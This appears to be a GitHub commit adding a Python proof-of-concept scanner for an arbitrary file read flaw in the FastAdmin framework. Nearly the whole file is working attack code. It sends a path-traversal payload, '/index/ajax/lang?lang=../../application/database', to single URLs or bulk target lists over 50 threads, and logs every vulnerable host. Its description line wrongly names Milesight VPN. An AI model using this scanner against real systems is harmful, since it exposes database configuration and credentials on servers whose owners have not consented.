8396e953ebbe11c3632ce3f686bbfd938791adce
LaoW1823 <117072480+LaoW1823@users.noreply.github.com>
2024-06-18 19:56:11 +0800

    Create Fastadmin_Fileread.py

---
+++ Fastadmin框架存在任意文件读取漏洞/Fastadmin_Fileread.py
@@ -0,0 +1,86 @@
+# Fastadmin框架存在任意文件读取漏洞
+
+import argparse
+from multiprocessing.dummy import Pool
+import requests
+import sys
+requests.packages.urllib3.disable_warnings()
+GREEN = '\033[92m'
+RESET = '\033[0m'
+
+#定义横幅
+def banner():
+    banner = """
+
+███████╗██╗██╗     ███████╗██████╗ ███████╗ █████╗ ██████╗ 
+██╔════╝██║██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
+█████╗  ██║██║     █████╗  ██████╔╝█████╗  ███████║██║  ██║
+██╔══╝  ██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║  ██║
+██║     ██║███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝
+╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝                      
+                                    version:Fastadmin_Fileread
+                                    Author: Laow🚦
+                                                
+"""
+    print(banner)
+
+
+#定义主函数
+def main():
+    #调用横幅
+    banner()
+    #argparse模块处理命令行参数
+    parser = argparse.ArgumentParser(description="Milesight VPN server.js 任意文件读取漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
+    args = parser.parse_args()
+    #如果用户输入url而不是file时：
+    if args.url and not args.file:
+        poc(args.url)
+    #如果用户输入file而不是url时：
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,mode='r',encoding='utf-8') as fr:
+            for i in fr.readlines():
+                url_list.append(i.strip().replace('\n',''))
+                # print(url_list)    
+                #设置多线程 
+        mp = Pool(50)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    #如果用户输入的既不是url也不是file时：
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+             
+#定义poc
+def poc(target):
+    payload = "/index/ajax/lang?lang=../../application/database"
+    url = target+payload
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", 
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
+        "Accept-Encoding": "gzip, deflate", 
+        "Accept-Language": "zh-CN,zh;q=0.9", 
+        "Connection": "close"
+        }
+    proxies = {
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+
+    try:
+        re = requests.get(url=url,headers=headers,verify=False,proxies=proxies,timeout=5)
+        if re.status_code == 200 and 'database' in re.text:
+            print( f"{GREEN}[+] {url} 存在任意文件读取漏洞！{RESET}")
+            with open('result.txt',mode='a',encoding='utf-8')as ft:
+                ft.write(target+'\n')
+        else:
+            print(f'该{target}不存在该漏洞')
+    except:
+        pass
+        # print(f'该{target}存在问题，请手动测试')
+
+
+if __name__ == '__main__':
+    main()
